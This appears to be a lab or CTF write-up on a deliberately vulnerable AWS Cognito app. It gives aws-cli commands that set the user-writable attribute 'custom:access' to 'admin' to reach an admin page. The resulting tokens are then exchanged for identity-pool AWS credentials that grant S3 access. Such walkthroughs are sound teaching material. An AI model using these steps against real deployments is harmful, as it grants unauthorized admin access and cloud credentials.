------------------

### Vulnerable Cognito

-------------------

- Create an account with an original mail
- Note the following stuffs for client-id and others for aws-cli

> Userpoolid
> client-id

<img width="510" height="267" alt="image" src="https://github.com/user-attachments/assets/0ab65fb5-e026-4d07-979b-f1aa1d957412" />

- Confirming verification-code-:

```bash
aws cognito-idp confirm-sign-up \                                                                                                                                                     ─╯
  --client-id <client-id> \
  --username <*@gmail.com> \
  --confirmation-code <code> --region us-east-1 | jq
```

- In the index.html's code, you'll notice an attributes `custom:access` which will grant special permissions if the value is `admin`-:

```js
 var access = result[4].getValue() // currently the 'custom:access' is at index 4
        // or if the index changes again,
        // the following code always gets it
        // for (const name of result) {
        //   if (name.Name === "custom:access") {
        //     access = name.Value;
        //   }
        // }

        console.log(access)

        if(access == 'admin'){
          window.location = "./admin.html";
        }
```

- Updating attributes with aws-cli-:

```bash
aws cognito-idp update-user-attributes --access-token "<access-token>" --user-attributes Name="custom:access",Value="admin" --region us-east-1 | jq
```
- The new updated creds redirects us to `admin.html` after login which grants us identity pool credentials which we can exchange to aws short term credentials. Note the following in the picture.

> Identitypool id for creating issuer
> Identity token

<img width="1247" height="255" alt="image" src="https://github.com/user-attachments/assets/ede1a7a6-e149-4958-8176-fdccfbe93fa8" />

- Exchanging the items above for an identity id-:

```bash
aws cognito-identity get-id \
  --identity-pool-id "[identitypoolid]" \
  --logins="cognito-idp.[region].amazonaws.com/[userpoolid]=[token]" \
  --region us-east-1 | jq
```

<img width="1916" height="223" alt="image" src="https://github.com/user-attachments/assets/ff5afb1b-a6d9-47c4-a457-0318d42aee80" />

- Short lived credentials exchange-:

```bash
aws cognito-identity get-credentials-for-identity \ 
  --identity-id "[identityid]" \
  --logins="cognito-idp.us-east-1.amazonaws.com/[user_pool_id]=[identity_token]" \
  --region us-east-1 | jq
```

- Running enumerate-iam shows we have access to s3 buckets-:

<img width="1919" height="504" alt="image" src="https://github.com/user-attachments/assets/985de788-473b-4d5a-bc3a-4357f0977509" />

-------------------
